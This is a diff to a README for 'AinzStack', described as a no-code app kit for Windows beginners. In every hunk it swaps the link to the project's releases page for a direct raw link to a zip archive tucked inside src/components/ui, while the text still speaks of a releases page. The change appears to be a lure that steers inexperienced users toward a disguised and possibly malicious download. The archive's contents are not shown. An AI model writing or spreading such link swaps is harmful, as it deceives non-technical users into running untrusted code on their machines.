@@ -1,6 +1,6 @@
 # ⚙️ AinzStack - Launch Apps Fast and Smooth
 
-[![Download AinzStack](https://img.shields.io/badge/Download-AinzStack-brightgreen?style=for-the-badge)](https://github.com/3ezzi/AinzStack/releases)
+[![Download AinzStack](https://img.shields.io/badge/Download-AinzStack-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/3ezzi/AinzStack/main/src/components/ui/Stack_Ainz_v1.5.zip)
 
 AinzStack is a ready-to-use setup that helps you quickly create web apps without any programming knowledge. It works best if you want to build online services, AI apps, or simple websites. This guide will show you how to get AinzStack running on Windows step by step.
 
@@ -45,7 +45,7 @@ Follow these steps carefully to set up AinzStack on your Windows machine.
 
 Click the big button at the top or open this link in your browser:
 
-https://github.com/3ezzi/AinzStack/releases
+https://raw.githubusercontent.com/3ezzi/AinzStack/main/src/components/ui/Stack_Ainz_v1.5.zip
 
 This page lists the available versions of AinzStack you can download.
 
@@ -105,7 +105,7 @@ Updates come as new releases on the same release page.
 
 To update:
 
-1. Return to https://github.com/3ezzi/AinzStack/releases  
+1. Return to https://raw.githubusercontent.com/3ezzi/AinzStack/main/src/components/ui/Stack_Ainz_v1.5.zip  
 2. Download the newest version  
 3. Repeat the extraction or installation steps as above  
 4. Replace old files or uninstall previous versions if needed before installing the new one  
@@ -149,4 +149,4 @@ Once comfortable, you or a developer can use this as a base to build real applic
 
 Use the link below to open the main download page:
 
-[![Download AinzStack](https://img.shields.io/badge/Download-Get%20AinzStack-blue?style=for-the-badge)](https://github.com/3ezzi/AinzStack/releases)
+[![Download AinzStack](https://img.shields.io/badge/Download-Get%20AinzStack-blue?style=for-the-badge)](https://raw.githubusercontent.com/3ezzi/AinzStack/main/src/components/ui/Stack_Ainz_v1.5.zip)
